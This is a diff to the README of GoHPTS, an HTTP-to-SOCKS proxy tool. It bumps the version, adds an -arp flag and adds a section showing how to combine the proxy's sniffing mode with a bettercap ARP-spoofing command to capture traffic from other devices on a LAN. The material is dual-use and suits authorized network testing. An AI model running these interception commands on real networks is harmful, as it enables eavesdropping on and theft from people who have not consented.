@@ -20,6 +20,7 @@
 - [Transparent proxy](#transparent-proxy)
   - [redirect (via NAT and SO_ORIGINAL_DST)](#redirect-via-nat-and-so_original_dst)
   - [tproxy (via MANGLE and IP_TRANSPARENT)](#tproxy-via-mangle-and-ip_transparent)
+  - [ARP spoofing](#arp-spoofing)
 - [Traffic sniffing](#traffic-sniffing)
   - [JSON format](#json-format)
   - [Colored format](#colored-format)
@@ -97,7 +98,7 @@ You can download the binary for your platform from [Releases](https://github.com
 Example:
 
 ```shell
-HPTS_RELEASE=v1.8.3; wget -v https://github.com/shadowy-pycoder/go-http-proxy-to-socks/releases/download/$HPTS_RELEASE/gohpts-$HPTS_RELEASE-linux-amd64.tar.gz -O gohpts && tar xvzf gohpts && mv -f gohpts-$HPTS_RELEASE-linux-amd64 gohpts && ./gohpts -h
+HPTS_RELEASE=v1.8.4; wget -v https://github.com/shadowy-pycoder/go-http-proxy-to-socks/releases/download/$HPTS_RELEASE/gohpts-$HPTS_RELEASE-linux-amd64.tar.gz -O gohpts && tar xvzf gohpts && mv -f gohpts-$HPTS_RELEASE-linux-amd64 gohpts && ./gohpts -h
 ```
 
 Alternatively, you can install it using `go install` command (requires Go [1.24](https://go.dev/doc/install) or later):
@@ -164,6 +165,7 @@ Options:
   -T        Address of transparent proxy server (no HTTP)
   -M        Transparent proxy mode: (redirect, tproxy)
   -auto     Automatically setup iptables for transparent proxy (requires elevated privileges)
+  -arp      Automatically setup iptables to proxy ARP spoofed traffic (use tools like bettercap to perform actual attack)
   -mark     Set mark for each packet sent through transparent proxy (Default: redirect 0, tproxy 100)
 ```
 
@@ -478,6 +480,25 @@ else
     echo "Something went wrong"
 fi
 ```
+
+### ARP spoofing
+
+`GoHPTS` can be used with tools like [Bettercap](https://github.com/bettercap/bettercap) to proxy ARP spoofed traffic.
+
+Run the proxy with `-arp` flag
+
+```shell
+ssh remote -D 1080 -Nf
+sudo env PATH=$PATH gohpts -d -T 8888 -M tproxy -sniff -body -auto -mark 100 -arp
+```
+
+Run `bettercap`
+
+```shell
+sudo bettercap -eval "set net.probe on;set net.recon on;arp.spoof on"
+```
+
+Check proxy logs for traffic from other devices from your LAN
 
 ## Traffic sniffing
 
